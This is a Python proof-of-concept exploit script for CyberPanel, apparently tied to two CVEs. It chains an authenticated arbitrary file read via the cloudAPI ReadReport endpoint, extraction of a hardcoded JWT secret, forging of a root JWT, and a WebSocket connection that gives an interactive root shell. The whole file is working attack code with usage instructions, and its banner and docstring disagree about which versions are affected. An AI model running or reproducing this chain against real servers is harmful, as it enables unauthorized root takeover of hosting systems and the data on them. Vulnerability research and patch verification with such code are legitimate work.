#!/usr/bin/env python3
"""
CyberPanel <= 3.0.0 - Authenticated Arbitrary File Read + Harcoded JWT Secret to RCE
CVEs: CVE-2026-67613 & CVE-2026-67614

Exploit Chain:
  Step 1: cloudAPI ReadReport (no path validation) -> read fastapi_ssh_server.py
  Step 2: Extract hardcoded JWT_SECRET from file content
  Step 3: Forge JWT token with ssh_user=root
  Step 4: Connect to WebTerminal WebSocket (port 8888), get root shell

Requirements:
  - CyberPanel admin credentials (username + password OR API token)
  - API access enabled on target (admin.api == 1)
  - Port 8888 accessible from attacker machine

Usage:
  python3 rce.py <target_ip> <admin_user> <admin_password>
  python3 rce.py <target_ip> <admin_user> <admin_password> --panel-port 8090 --ws-port 8888
  python3 rce.py 192.168.1.31 admin MyPassword123

Author: Deniz Mert
"""

import sys
import ssl
import json
import re
import asyncio
import hashlib
import argparse
import urllib.request
import urllib.error
import websockets

def generate_token(username: str, password: str) -> str:
    credentials = f"{username}:{password}".encode()
    hashed = hashlib.sha256(credentials).hexdigest()
    return f"Basic {hashed}"


def read_remote_file(target: str, panel_port: int, token: str, file_path: str) -> str:
    url = f"https://{target}:{panel_port}/cloudAPI/"
    payload = json.dumps({
        "controller": "ReadReport",
        "serverUserName": "admin",
        "reportFile": file_path
    }).encode()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, data=payload, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", token)

    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            result = json.loads(resp.read().decode())
            if result.get("status") == 1:
                return result.get("reportContent", "")
            else:
                print(f"[-] ReadReport failed: {result.get('error_message')}")
                return ""
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP error: {e.code} {e.reason}")
        return ""
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return ""

def extract_jwt_secret(file_content: str) -> str:
    match = re.search(r'JWT_SECRET\s*=\s*["\']([^"\']+)["\']', file_content)
    if match:
        return match.group(1)
    return ""

def forge_jwt(secret: str, ssh_user: str = "root") -> str:
    import base64
    import hmac
    import hashlib

    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"ssh_user": ssh_user}).encode())
    signing_input = f"{header}.{payload}".encode()
    signature = b64url(
        hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    )
    return f"{header}.{payload}.{signature}"

async def websocket_shell(target: str, ws_port: int, token: str, ssh_user: str = "root"):
    uri = f"wss://{target}:{ws_port}/ws?token={token}&ssh_user={ssh_user}"

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    print(f"[*] Connecting to WebTerminal at {target}:{ws_port}")
    print(f"[*] SSH user: {ssh_user}")
    print()

    async with websockets.connect(uri, ssl=ssl_ctx) as ws:

        async def recv_loop():
            while True:
                try:
                    msg = await ws.recv()
                    output = msg if isinstance(msg, str) else msg.decode("utf-8", errors="replace")
                    sys.stdout.write(output)
                    sys.stdout.flush()
                except Exception:
                    break

        recv_task = asyncio.create_task(recv_loop())

        loop = asyncio.get_event_loop()
        while True:
            try:
                cmd = await loop.run_in_executor(None, sys.stdin.readline)
                if not cmd:
                    break
                await ws.send(cmd.encode())
            except (KeyboardInterrupt, EOFError):
                break
            except Exception:
                break

        recv_task.cancel()

def main():
    parser = argparse.ArgumentParser(
        description="CyberPanel <= 3.0.0 Authenticated File Read + RCE Chain"
    )
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("username", help="CyberPanel admin username")
    parser.add_argument("password", help="CyberPanel admin password")
    parser.add_argument("--panel-port", type=int, default=8090, help="CyberPanel port (default: 8090)")
    parser.add_argument("--ws-port", type=int, default=8888, help="WebTerminal port (default: 8888)")
    parser.add_argument("--ssh-user", default="root", help="SSH user to impersonate (default: root)")
    parser.add_argument("--file", default="/usr/local/CyberCP/fastapi_ssh_server.py",
                        help="File to read via ReadReport (default: fastapi_ssh_server.py)")
    args = parser.parse_args()

    print("=" * 60)
    print("  CyberPanel <= 2.4.9 - File Read + RCE Exploit Chain")
    print("=" * 60)
    print(f"[*] Target      : {args.target}:{args.panel_port}")
    print(f"[*] Credentials : {args.username} / {args.password}")
    print()

    print("[*] Step 1: Generating API token...")
    api_token = generate_token(args.username, args.password)
    print(f"[+] Token       : {api_token[:40]}...")

    print(f"\n[*] Step 2: Reading {args.file} via ReadReport...")
    file_content = read_remote_file(args.target, args.panel_port, api_token, args.file)

    if not file_content:
        print("[-] Failed to read file. Check credentials and API access.")
        print("    Tip: Ensure API access is enabled for admin user.")
        sys.exit(1)

    print(f"[+] File read successfully ({len(file_content)} bytes)")

    print("\n[*] Step 3: Extracting JWT_SECRET...")
    jwt_secret = extract_jwt_secret(file_content)

    if not jwt_secret:
        print("[-] Could not extract JWT_SECRET from file content.")
        sys.exit(1)

    print(f"[+] JWT_SECRET  : {jwt_secret}")

    print(f"\n[*] Step 4: Forging JWT token for user '{args.ssh_user}'...")
    forged_token = forge_jwt(jwt_secret, args.ssh_user)
    print(f"[+] Forged token: {forged_token[:60]}...")

    print(f"\n[*] Step 5: Connecting to WebTerminal (port {args.ws_port})...")
    print("-" * 60)

    try:
        asyncio.run(websocket_shell(args.target, args.ws_port, forged_token, args.ssh_user))
    except KeyboardInterrupt:
        print("\n[*] Exiting.")

if __name__ == "__main__":
    main()
